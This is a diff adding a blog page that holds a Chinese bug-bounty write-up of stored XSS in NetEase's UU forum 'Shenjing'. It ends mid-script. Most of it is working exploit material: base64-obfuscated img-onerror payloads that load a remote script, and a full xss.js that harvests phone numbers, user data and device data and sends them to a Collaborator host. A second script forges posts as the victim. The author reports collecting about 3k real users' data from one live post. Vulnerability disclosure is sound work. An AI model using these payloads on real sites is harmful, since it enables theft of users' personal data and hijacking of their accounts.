@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>中危(重复)：网易UU论坛深井Web发帖和回复存储型XSS漏洞 | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="中危(重复)：网易UU论坛深井Web发帖和回复存储型XSS漏洞" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/xss/2023/09/15/uu-xss.html" />
+<meta property="og:url" content="http://localhost:4000/xss/2023/09/15/uu-xss.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-15T10:26:18+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="中危(重复)：网易UU论坛深井Web发帖和回复存储型XSS漏洞" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-09-15T10:26:18+08:00","datePublished":"2023-09-15T10:26:18+08:00","description":"Name","headline":"中危(重复)：网易UU论坛深井Web发帖和回复存储型XSS漏洞","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/xss/2023/09/15/uu-xss.html"},"url":"http://localhost:4000/xss/2023/09/15/uu-xss.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">中危(重复)：网易UU论坛深井Web发帖和回复存储型XSS漏洞</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-09-15T10:26:18+08:00" itemprop="datePublished">Sep 15, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易UU论坛深井Web发帖和回复存在存储型XSS漏洞，影响Web端和手机客户端应用</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>中危，重复</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+<ul>
+  <li>POST https://sowellwell.com/w/v1/community/post/new</li>
+  <li>POST https://sowellwell.com/w/v1/comment/proxy</li>
+  <li>最新深井APP</li>
+  <li>弹窗测试,可以点开验证：<code class="language-plaintext highlighter-rouge">https://sowellwell.com/t/612f69f604c21506084dcda2/64fbcdd79f6f44db8d94a7d2</code>
+    <h2 id="key-payload">Key Payload</h2>
+    <ol>
+      <li>
+        <p>发送XSS帖子</p>
+
+        <p>POST /w/v1/community/post/new HTTP/2
+   Host: sowellwell.com
+   Cookie: jssdk_deviceid=jssdk_pbRJTpNazMAEeEM2; _sj_web_session_id=_DeAsdSR
+   Content-Length: 540
+   Identifier: jssdk_pbRJTpNazMAEeEM2
+   Accept: application/json, text/plain, <em>/</em>
+   Content-Type: application/json;charset=UTF-8
+   Sec-Ch-Ua: “Chromium”;v=”116”, “Not)A;Brand”;v=”24”, “Google Chrome”;v=”116”
+   Sec-Ch-Ua-Mobile: ?0
+   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+   Sec-Ch-Ua-Platform: “Windows”
+   Origin: https://sowellwell.com
+   Sec-Fetch-Site: same-origin
+   Sec-Fetch-Mode: cors
+   Sec-Fetch-Dest: empty
+   Referer: https://sowellwell.com/z/1y8
+   Accept-Encoding: gzip, deflate
+   Accept-Language: ja-JP,ja;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6,en;q=0.5</p>
+
+        <p>{“coid”:””,”coids”:[“638ffd8957244da64ff580da”],”title”:”测试标题？”,”content”:”&lt;div id="mobile_article_theme_warm" class="content_markdown_body"&gt;&lt;p&gt;如题xss payload&lt;img src=x onerror=eval(atob(‘dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGNTkyYjUxNGQyYmRkNGJmMDhiZmI1YmRiNzQ1ZGY3Y2MnO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs=’))&gt;&lt;/p&gt;&lt;/div&gt;”,”device_name”:”Web”,”watermark”:true,”media”:[],”publish_type”:”post”}</p>
+      </li>
+    </ol>
+  </li>
+</ul>
+
+<ol>
+  <li>
+    <p>发送XSS评论</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/comment/proxy HTTP/2
+ Host: sowellwell.com
+ Cookie: jssdk_deviceid=xx; _sj_web_session_id=_DeA0g039t-
+ Content-Length: 997
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+ Sec-Ch-Ua-Mobile: ?0
+ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+ Sec-Ch-Ua-Platform: "Windows"
+ Origin: https://sowellwell.com
+ Sec-Fetch-Site: same-origin
+ Sec-Fetch-Mode: cors
+ Sec-Fetch-Dest: empty
+ Referer: https://sowellwell.com/ts/2/4yGt?from=comment
+ Accept-Encoding: gzip, deflate
+ Accept-Language: ja-JP,ja;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6,en;q=0.5
+
+ {"path":"/message/apps/uu/server/create_message","method":"POST","params":{"uid":"140250100348","category":"64e4cadffe367318734c6c26","category_name":"64e4cadffe367318734c6c26","content":"占位223&lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGNTkyYjUxNGQyYmRkNGJmMDhiZmI1YmRiNzQ1ZGY3Y2MnO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;\n","extra":"{\"device_name\":\"web\",\"platform\":\"web\",\"posts\":{\"gid\":\"596dd2b6e3a8b2614a13b413\",\"coid\":\"596dd2b6e3a8b2614a13b413\"}}","user_info":{"game_uid":"140250100348","name":"笠泽九斤翅子树","avatar":"https://uum.fp.ps.netease.com/file/5d3fe7616f04942682c67a4clvtOFQXb02","user_type":1,"extra":"{\"user_title\":{},\"level_info\":{\"level\":2,\"cur_exp\":150,\"battery\":4,\"total_exp\":250}}"},"device":{"device_id":"jssdk_pbRJTpNazMAEeEM2"}},"id":"64e4cadffe367318734c6c26","server_type":1}
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="summary">Summary</h2>
+<p>网易UU加速器论坛深井<code class="language-plaintext highlighter-rouge">https://sowellwell.com</code>的发帖和回复存在XSS存储型漏洞，攻击者能够将XSS脚本嵌入PC端浏览器页面和手机端Webview页面，实现信息窃取（手机号，pc和手机端）、代替用户发送任意帖子或评论（pc端）、自动点赞收藏关注等恶意行为。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>登录深井Web平台<code class="language-plaintext highlighter-rouge">https://sowellwell.com</code></li>
+  <li>发送帖子，用burpsuite截取发帖POST为<code class="language-plaintext highlighter-rouge">https://sowellwell.com/w/v1/community/post/new</code>
+<img src="/assets/uu_images/post.png" alt="post" /></li>
+  <li>
+    <p>将请求发送到burp repeater，修改发帖内容为img onerror触发的弹窗，然后发送</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/community/post/new HTTP/2
+ Host: sowellwell.com
+ Cookie: xxx
+ Content-Length: 232
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+ Sec-Ch-Ua-Mobile: ?0
+
+ {"coid":"","coids":[],"title":"鹅鸭杀有组队的吗？","content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;&lt;/div&gt;","device_name":"Web","watermark":true,"media":[],"publish_type":"post"}
+</code></pre></div>    </div>
+  </li>
+  <li>发送帖子后，进入发送的帖子页面，可以看到弹窗已经触发
+<img src="/assets/uu_images/alert.png" alt="alert" /></li>
+  <li>
+    <p>回复评论同样存在该漏洞
+<img src="/assets/uu_images/comment.png" alt="comment" /></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/comment/proxy HTTP/2
+ Host: sowellwell.com
+ Cookie: xxx
+ Content-Length: 995
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+ Sec-Ch-Ua-Mobile: ?0
+
+ {"path":"/message/apps/uu/server/create_message","method":"POST","params":{"uid":"140250100348","category":"64e345d09f08bdd6f2385d78","category_name":"64e345d09f08bdd6f2385d78","content":"getinfo2&lt;img src=x onerror=alert(document.domain)&gt;\n","extra":"{\"device_name\":\"web\",\"platform\":\"web\",\"posts\":{\"gid\":\"596dd2b6e3a8b2614a13b413\",\"coid\":\"596dd2b6e3a8b2614a13b413\"}}","user_info":{"game_uid":"140250100348","name":"笠泽九斤翅子树","avatar":"https://uum.fp.ps.netease.com/file/5d3fe7616f04942682c67a4clvtOFQXb02","user_type":1,"extra":"{\"user_title\":{},\"level_info\":{\"level\":2,\"cur_exp\":60,\"battery\":3,\"total_exp\":250}}"},"device":{"device_id":"jssdk_pbRJTpNazMAEeEM2"}},"id":"64e345d09f08bdd6f2385d78","server_type":1}
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h4 id="窃取用户信息">窃取用户信息</h4>
+<p>既然存在XSS，那么可深入探究一下能够造成多大的影响。由于cookie设置了httpOnly，所以会话劫持无法利用。但是将脚本嵌入到Web页面，在用户的浏览器或者Webview中执行。首先想到的就是收集用户信息。</p>
+<ol>
+  <li>
+    <p>xss payload构造</p>
+
+    <p>上一步我们实现了xss弹窗，接下来可以直接嵌入js脚本，实现更复杂的利用。由于平台对script标签进行过滤，所以我们通过img标签的onerror来进行嵌入。payload如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;img src=x onerror=eval("var script=document.createElement('script');script.src='https://my.domain.com/xss.js';document.getElementsByTagName('body')[0].appendChild(script);")&gt;
+</code></pre></div>    </div>
+
+    <p>将eval中的字符串用base64进行编码，并且再用atob进行解码，得到最终payload：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGNTkyYjUxNGQyYmRkNGJmMDhiZmI1YmRiNzQ1ZGY3Y2MnO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;
+</code></pre></div>    </div>
+
+    <p>这样我们可以将复杂的利用写入xss.js，并且上传到自己的https服务器上，请将payload中的<code class="language-plaintext highlighter-rouge">https://my.domain.com/xss.js</code>换成自己的服务器地址。</p>
+  </li>
+  <li>
+    <p>利用脚本构造</p>
+
+    <p>观察到用户在登录时，深井会通过get请求来获取当前登录用户的信息<code class="language-plaintext highlighter-rouge">https://sowellwell.com/w/v1/account/info</code>，信息中包含用户的手机号码。
+ <img src="/assets/uu_images/phone.png" alt="phone" />
+ 其中，Header中包含<code class="language-plaintext highlighter-rouge">Identifier</code>字段，需要此字段才能完成合法请求。而该字段等于cookie的<code class="language-plaintext highlighter-rouge">jssdk_deviceid</code>字段，该字段不受httpOnly保护，因此可以直接通过cookie获取。那么我们可以在利用脚本中，代替用户发送该url，从而获取登录并且浏览到xss页面的用户信息。构造利用脚本如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
+ const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+
+ // 获取cookie信息
+ const getCookieValue = (name) =&gt; (
+     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+ )
+
+ // 构造发送请求
+ const myFetch = async (url, token) =&gt; {
+     let data = await fetch(url, {
+         method: 'GET',
+         headers: {
+             'Identifier': token,
+         },
+     })
+     let res = await data.json();
+     return res
+ }
+
+ // 通过img src来向burpsuite collaborator url外送敏感新信息
+ const justSend = async url =&gt; {
+     var Img = new Image
+     Img.src = url
+ }
+
+ // base64 加解密
+ const encode = str =&gt; {
+     var b64 = btoa(unescape(encodeURIComponent(str)))
+     return b64
+ }
+ const decode = str =&gt; {
+     var str = decodeURIComponent(escape(atob(str)));
+     return str
+ }
+
+ // 发送请求获取用户信息后，向攻击者服务器外送
+ const startSend = async function() {
+     const deviceid = getCookieValue('jssdk_deviceid')
+     res = await myFetch('https://sowellwell.com/w/v1/account/info', deviceid)
+     var encoded = encode(JSON.stringify(res))
+     // send data
+     justSend(api_burp+'?data='+encoded)
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>手机客户端利用</p>
+
+    <p>观察到深井配有手机客户端，于是检查xss是否能够在其中触发。通过Root后的手机上安装EdXposed，并且安装TrustMeAlready模块导入burp证书，安装WebViewPP模块来启动Webview debug模式后，最后用chrome devtools调试手机端帖子的页面，发现深井应用浏览帖子基于Webview，并且XSS脚本能够执行。</p>
+
+    <p>图示 xss嵌入webview
+ <img src="/assets/uu_images/webview1.png" alt="webview-xss" />
+ 图示 xss脚本已下载
+ <img src="/assets/uu_images/webview2.png" alt="webview-xss2" /></p>
+  </li>
+  <li>
+    <p>手机端信息收集</p>
+
+    <p>通过分析手机端Webview加载的js代码，发现webview会调用android暴露的JavascriptInterface实现用户信息、设备信息获取等操作。如下图，js文件<code class="language-plaintext highlighter-rouge">https://sj.uu.163.com/community/js/app.c1039443.js</code>的<code class="language-plaintext highlighter-rouge">getUserInfo</code>函数和<code class="language-plaintext highlighter-rouge">getAppInfo</code>函数能够实现用户和设备信息获取。他们所调用的<code class="language-plaintext highlighter-rouge">UUJSSDK.Bridge</code>就是<code class="language-plaintext highlighter-rouge">JavascriptInterface</code>。因此，对于手机客户端收集用户和设备信息，我们可以直接调用<code class="language-plaintext highlighter-rouge">UUJSSDK.Bridge</code>来获取这两类信息。
+ <img src="/assets/uu_images/webview3.png" alt="webview-xss3" /></p>
+
+    <p>构造手机客户端信息收集脚本如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const getUserInfo = async function(){
+     UUJSSDK.Bridge({api: "get_user_info",cbname: "get_user_info_cb",done: function(res) {
+         console.log(res["result"])
+         var encoded = encode(JSON.stringify(res["result"]))
+         UUJSSDK.Bridge({
+             api: "get_app_info",
+             params: {},
+             done: function(res2) {
+                 var encoded2 = encode(JSON.stringify(res2))
+                 justSend(api_burp+'?userinfo='+encoded+'&amp;appinfo='+encoded2)
+             }
+         });
+     }})
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>完整利用xss.js利用脚本如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // burpsuite collaborator url
+ const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+
+ // 获取cookie信息
+ const getCookieValue = (name) =&gt; (
+     document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+ )
+
+ // 构造发送请求
+ const myFetch = async (url, token) =&gt; {
+     let data = await fetch(url, {
+         method: 'GET',
+         headers: {
+             'Identifier': token,
+         },
+     })
+     let res = await data.json();
+     return res
+ }
+
+ // 通过img src来向burpsuite collaborator url外送敏感新信息
+ const justSend = async url =&gt; {
+     var Img = new Image
+     Img.src = url
+ }
+
+ // base64 加解密
+ const encode = str =&gt; {
+     var b64 = btoa(unescape(encodeURIComponent(str)))
+     return b64
+ }
+ const decode = str =&gt; {
+     var str = decodeURIComponent(escape(atob(str)));
+     return str
+ }
+
+ // 发送请求获取用户信息后，向攻击者服务器外送
+ const startSend = async function() {
+     const deviceid = getCookieValue('jssdk_deviceid')
+     res = await myFetch('https://sowellwell.com/w/v1/account/info', deviceid)
+     var encoded = encode(JSON.stringify(res))
+     // send data
+     justSend(api_burp+'?data='+encoded)
+ }
+
+ // 获取手机客户端用户信息
+ const getUserInfo = async function(){
+     UUJSSDK.Bridge({api: "get_user_info",cbname: "get_user_info_cb",done: function(res) {
+         console.log(res["result"])
+         var encoded = encode(JSON.stringify(res["result"]))
+         UUJSSDK.Bridge({
+             api: "get_app_info",
+             params: {},
+             done: function(res2) {
+                 var encoded2 = encode(JSON.stringify(res2))
+                 justSend(api_burp+'?userinfo='+encoded+'&amp;appinfo='+encoded2)
+             }
+         });
+     }})
+ }
+ // 判断pc端还是手机端
+ const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+ if (isMobile) {
+ /* your code here */
+     getUserInfo()
+ }else{
+     startSend()
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>通过发帖或者评论发送xss payload</p>
+
+    <p>将上述脚本上传到攻击者的服务器，例如<code class="language-plaintext highlighter-rouge">https://my.domain.com/xss.js</code>，然后构造payload如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "var script=document.createElement('script');script.src='https://my.domain.com/xss.js';document.getElementsByTagName('body')[0].appendChild(script);"
+
+ base64编码后：
+
+ &lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGNTkyYjUxNGQyYmRkNGJmMDhiZmI1YmRiNzQ1ZGY3Y2MnO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;
+</code></pre></div>    </div>
+
+    <p>该payload通过发帖来发送：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/community/post/new HTTP/2
+ Host: sowellwell.com
+ Cookie: jssdk_deviceid=jssdk_pbRJTpNazMAEeEM2; _sj_web_session_id=_DeAsdSRanqTAC0g039t-HNRDYuBvSxPIK
+ Content-Length: 232
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+ Sec-Ch-Ua-Mobile: ?0
+    
+
+ {"coid":"","coids":[],"title":"鹅鸭杀有组队的吗？","content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGNTkyYjUxNGQyYmRkNGJmMDhiZmI1YmRiNzQ1ZGY3Y2MnO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;&lt;/p&gt;&lt;/div&gt;","device_name":"Web","watermark":true,"media":[],"publish_type":"post"}
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>观察burp collaborator</p>
+
+    <p>收集到PC端用户信息：
+ <img src="/assets/uu_images/info1.png" alt="info1" />
+ <img src="/assets/uu_images/info2.png" alt="info2" />
+ 收集到手机客户端用户信息：
+ <img src="/assets/uu_images/info3.png" alt="info3" />
+ 单个帖子两周一共收集到<strong>3k</strong>用户信息：
+ <img src="/assets/uu_images/info4.png" alt="info4" /></p>
+  </li>
+</ol>
+
+<h4 id="伪造发帖">伪造发帖</h4>
+
+<ol>
+  <li>
+    <p>既然上一步攻击者能够代替受害者发送get请求来获取敏感信息，那么也可以发送post请求，达到伪造帖子和评论的目的。</p>
+
+    <p>例如，Web用户对于如下发帖请求：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> POST /w/v1/community/post/new HTTP/2
+ Host: sowellwell.com
+ Cookie: xxx
+ Content-Length: 232
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
+ Sec-Ch-Ua-Mobile: ?0
+
+ {"coid":"","coids":[],"title":"鹅鸭杀有组队的吗？","content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;&lt;/div&gt;","device_name":"Web","watermark":true,"media":[],"publish_type":"post"}
+</code></pre></div>    </div>
+
+    <p>构造Web端利用脚本如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> // 构造POST发送请求
+ const myPostFetch = async (url, token, payload) =&gt; {
+     let data = await fetch(url, {
+         method: 'POST',
+         headers: {
+             'Identifier': token,
+         },
+         body: JSON.stringify(payload),
+     })
+     let res = await data.json();
+     return res
+ }
+ // 代替受害者发送恶意帖子
+ const startSendPost = async function() {
+     const deviceid = getCookieValue('jssdk_deviceid')
+     var payload =  {
+         "coid":"",
+         "coids":[],
+         "title":"鹅鸭杀有组队的吗222223333？",
+         "content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=alert(document.domain)&gt;&lt;/p&gt;&lt;/div&gt;",
+         "device_name":"Web",
+         "watermark":true,
+         "media":[],
+         "publish_type":"post"
+     }
+     res = await myPostFetch('https://sowellwell.com/w/v1/community/post/new', deviceid, payload)
+ }
+ startSendPost()
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>将上述利用脚本上传到攻击者控制的服务器，例如<code class="language-plaintext highlighter-rouge">https://my.domain.com/xss.js</code>，然后构造发帖payload如下：</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 构造xss
+ "var script=document.createElement('script');script.src='https://my.domain.com/xxs.js';document.getElementsByTagName('body')[0].appendChild(script);"
+
+ base64：
+ dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGMWYwNjBlODY2NDQxNDU4ZDhlYjY1YWYyN2Q4YmFjMjInO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs=
+
+ xss payload：
+ &lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGMWYwNjBlODY2NDQxNDU4ZDhlYjY1YWYyN2Q4YmFjMjInO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;
+
+ 发送payload：
+ POST /w/v1/community/post/new HTTP/2
+ Host: sowellwell.com
+ Cookie: xxxxx
+ Content-Length: 514
+ Identifier: jssdk_pbRJTpNazMAEeEM2
+ Accept: application/json, text/plain, */*
+ Content-Type: application/json;charset=UTF-8
+ Origin: https://sowellwell.com
+
+ {"coid":"","coids":[],"title":"鹅鸭杀有组队的吗？","content":"&lt;div id=\"mobile_article_theme_warm\" class=\"content_markdown_body\"&gt;&lt;p&gt;如题&lt;img src=x onerror=eval(atob('dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGMWYwNjBlODY2NDQxNDU4ZDhlYjY1YWYyN2Q4YmFjMjInO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;&lt;/p&gt;&lt;/div&gt;","device_name":"Web","watermark":true,"media":[],"publish_type":"post"}
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>登录另一个账号，访问xss页面，实现自动代替受害者发帖</p>
+
+    <p>自动发帖链接（<strong>仅供测试，已经删除</strong>）：https://sowellwell.com/t/612f69f604c21506084dcda2/64fbd184bb034de073c97011
+ <img src="/assets/uu_images/autopost.png" alt="autopost" /></p>
+
+    <p>自动发帖成功：https://sowellwell.com/t/612f69f604c21506084dcda2/64fbd2e8bb034de073c97012
+ <img src="/assets/uu_images/swarm.png" alt="swarm" /></p>
+  </li>
+</ol>
+
+<h3 id="proof">Proof</h3>
+<p>请提供截图或视频
+完整利用脚本xss.js如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// burpsuite collaborator url
+const api_burp = 'https://e9op59j1geov80qd4hiuakntnktch3fr4.oastify.com'
+
+// 获取cookie信息
+const getCookieValue = (name) =&gt; (
+    document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)')?.pop() || ''
+)
+
+// 构造GET发送请求
+const myFetch = async (url, token) =&gt; {
+    let data = await fetch(url, {
+        method: 'GET',
+        headers: {
+            'Identifier': token,
+        },
+    })
+    let res = await data.json();
+    return res
+}
+
+// 构造POST发送请求
+const myPostFetch = async (url, token, payload) =&gt; {
+    let data = await fetch(url, {
+        method: 'POST',
+        headers: {
+            'Identifier': token,
+        },
+        body: JSON.stringify(payload),
+    })
+    let res = await data.json();
+    return res
+}
+
+// 通过img src来向burpsuite collaborator url外送敏感新信息
+const justSend = async url =&gt; {
+    var Img = new Image
+    Img.src = url
+}
+
+// base64 加解密
+const encode = str =&gt; {
+    var b64 = btoa(unescape(encodeURIComponent(str)))
+    return b64
+}
+const decode = str =&gt; {
+    var str = decodeURIComponent(escape(atob(str)));
+    return str
+}
+
+// 发送请求获取用户信息后，向攻击者服务器外送
+const startSend = async function() {
+    const deviceid = getCookieValue('jssdk_deviceid')
+    res = await myFetch('https://sowellwell.com/w/v1/account/info', deviceid)
+    var encoded = encode(JSON.stringify(res))
+    // send data
+    justSend(api_burp+'?data='+encoded)
+}
+
+// 代替受害者发送恶意帖子
+const startSendPost = async function() {
+    const deviceid = getCookieValue('jssdk_deviceid')
+    var payload =  {
+        "coid":"",
+        "coids":[],
+        "title":"鹅鸭杀有组队的吗222223333？",
